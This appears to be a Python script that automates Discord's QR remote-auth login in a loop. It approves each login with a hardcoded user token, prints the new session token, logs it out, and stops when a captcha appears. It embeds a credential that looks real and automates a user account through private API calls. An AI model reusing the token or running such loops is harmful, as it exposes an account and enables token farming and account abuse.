from asyncio import run, sleep as asleep
from remoteauthclient import RemoteAuthClient
from sys import exit as _exit
from aiohttp import ClientSession
from os import environ

TOKEN = "OTU1Mzk4MzA1OTYwMDUwNzA4.GANCpm.OEVoFvQnvAuqxc8gw9PQMp4DyP9umfg5r6k5d0"

async def login(fp):
    async with ClientSession() as sess:
        r = await sess.post("https://discord.com/api/v9/users/@me/remote-auth", json={"fingerprint": fp.split("/ra/")[1]}, headers={"Authorization": TOKEN})
        print(f"Fingerprint - {r.status}")
        j = await r.json()
        ht = j["handshake_token"]
        await asleep(3)
        r = await sess.post("https://discord.com/api/v9/users/@me/remote-auth/finish", json={"handshake_token": ht, "temporary_token": False}, headers={"Authorization": TOKEN})
        print(f"Login - {r.status}")
        await asleep(5)

async def logout(tok):
    async with ClientSession() as sess:
        r = await sess.post("https://discord.com/api/v9/auth/logout", json={}, headers={"Authorization": tok, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"})
        print(f"Logout - {r.status}")
    await asleep(10)

i = 1
while True:
    print("="*8 + f" LOOP {i} " + "="*8)
    c = RemoteAuthClient()

    @c.event("on_fingerprint")
    async def on_fingerprint(data):
        await login(data)

    @c.event("on_token")
    async def on_token(token):
        print(f"Token: {token}")
        await logout(token)

    @c.event("on_captcha")
    async def on_captcha(captcha_data):
        print(f"Captcha!")
        print(captcha_data)
        _exit()

    @c.event("on_error")
    async def on_error(exc, client):
        print(f"Error: {exc.__class__.__name__}")

    run(c.run())
    i += 1